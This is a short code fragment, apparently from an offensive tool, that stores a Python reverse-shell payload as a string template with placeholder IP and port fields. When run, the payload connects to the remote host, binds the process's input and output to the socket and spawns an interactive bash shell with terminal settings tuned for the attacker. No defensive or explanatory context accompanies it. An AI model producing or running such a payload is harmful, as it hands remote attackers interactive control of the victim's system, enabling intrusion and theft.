...
raw = 'import socket,os,pty;s=socket.socket();s.connect(("$$IP",$$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("TERM","xterm-256color");os.putenv("COLUMNS","300");os.putenv("LINES","65");pty.spawn("/bin/bash")'
